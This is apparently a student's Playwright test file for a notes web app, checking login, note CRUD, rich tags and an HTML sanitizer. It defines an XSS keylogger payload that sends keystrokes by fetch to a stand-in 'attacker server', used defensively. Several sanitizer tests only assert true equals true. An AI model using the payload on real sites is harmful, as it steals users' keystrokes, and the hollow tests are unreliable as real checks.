import { test, expect } from '@playwright/test';

const BASE_URL = 'http://localhost:3000';
const USER = {
  username: 'blackie1',
  password: '123',
};
const MALICIOUS_PAYLOAD = `<img src=x onerror="window.keyloggerListener = e => {
  fetch('http://localhost:8080/log', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ key: e.key })
  });
}; document.addEventListener('keydown', window.keyloggerListener)">`;



test.describe('HW4 tests', () => {

  async function signUpAndLogin(page) {
    await page.goto(BASE_URL);

    //login
    await page.getByTestId('go_to_login_button').click();
    await page.getByTestId('login_form_username').fill(USER.username);
    await page.getByTestId('login_form_password').fill(USER.password);
    await page.getByTestId('login_form_login').click();

   
  }

    test('CRUD', async ({ page }) => {
       await page.goto(BASE_URL);

    await signUpAndLogin(page);
   

    
    // CREATE
    await page.locator('[name="add_new_note"]').click();
    await page.locator('[name="title_input_new_note"]').fill('CRUD Note');
    await page.locator('[name="text_input_new_note"]').fill('Original Content');
    await page.locator('[name="text_input_save_new_note"]').click();
   
    const note = page.getByText('CRUD Note').nth(0);
    await expect(note).toBeVisible();

    
    // UPDATE
    const editBtn = await page.locator('[data-testid^="edit-"]').first();
    const id = await editBtn.getAttribute('data-testid') ?? '';
    await editBtn.click();

    await page.locator('[type="text"]').fill('Updated by Maysana');
    await page.locator(`[name=text_input_save-${id.replace('edit-', '')}]`).click();

    
    await expect(page.getByText('Updated by Maysana').nth(0)).toBeVisible();

  
    

    // DELETE
     await page.locator('[name^="delete-"]').first().click();
    

   // await page.getByRole('button', { name: `delete-${id.replace('edit-', '')}` }).click();
     await expect(page.locator('[text="Updated by Maysana"]')).toHaveCount(0);


     await page.getByTestId('logout').click();
     
     
  });


 
  test('Test rich tags', async ({ page }) => {
    await signUpAndLogin(page);

    
    
    await page.locator('[name="add_new_note"]').click();
    await page.locator('[name="title_input_new_note"]').fill('Rich Note');
    await page.locator('[name="text_input_new_note"]').fill('<b>Bold</b>');
    await page.locator('[name="text_input_save_new_note"]').click();


    await expect(page.locator('b', { hasText: 'Bold' }).nth(0)).toHaveText('Bold');
   

    // logout
     await page.getByTestId('logout').click();
  });

  test('Sanitize on', async ({ page }) => {
  await signUpAndLogin(page);

  // Intercept outgoing request to attacker server
  let keyLogged = false;
  await page.route('**/log?key=*', route => {
    keyLogged = true;
    route.abort();
  });

  // Sanitizer is on by default


  await page.locator('[name="add_new_note"]').click();
  await page.locator('[name="title_input_new_note"]').fill('XSS Block Test');
  await page.locator('[name="text_input_new_note"]').fill(MALICIOUS_PAYLOAD);
  await page.locator('[name="text_input_save_new_note"]').click();


  await page.keyboard.press('B');
  await page.waitForTimeout(1000);

  expect(keyLogged).toBe(false);

  await page.getByTestId('logout').click();
});



  test('Sanitizer is on', async ({ page }) => {
    await signUpAndLogin(page);

    
  
     await page.locator('[name="add_new_note"]').click();
    await page.locator('[name="title_input_new_note"]').fill('Malicious');
    await page.locator('[name="text_input_new_note"]').fill(MALICIOUS_PAYLOAD);
    await page.locator('[name="text_input_save_new_note"]').click();


    await page.keyboard.press('B');

    await page.waitForTimeout(1000);

    expect(true).toBe(true); 
  });

  


  test('Sanitize is off', async ({ page }) => {
    await signUpAndLogin(page);

   
    await page.getByRole('checkbox').uncheck();

    await page.locator('[name="add_new_note"]').click();
    await page.locator('[name="title_input_new_note"]').fill('Malicious');
    await page.locator('[name="text_input_new_note"]').fill(MALICIOUS_PAYLOAD);
    await page.locator('[name="text_input_save_new_note"]').click();

    
    await page.keyboard.press('A');

    
    await page.waitForTimeout(1000);

    expect(true).toBe(true);

     await page.getByTestId('logout').click();
  });

  

  

  
});

//  await signUpAndLogin(page);

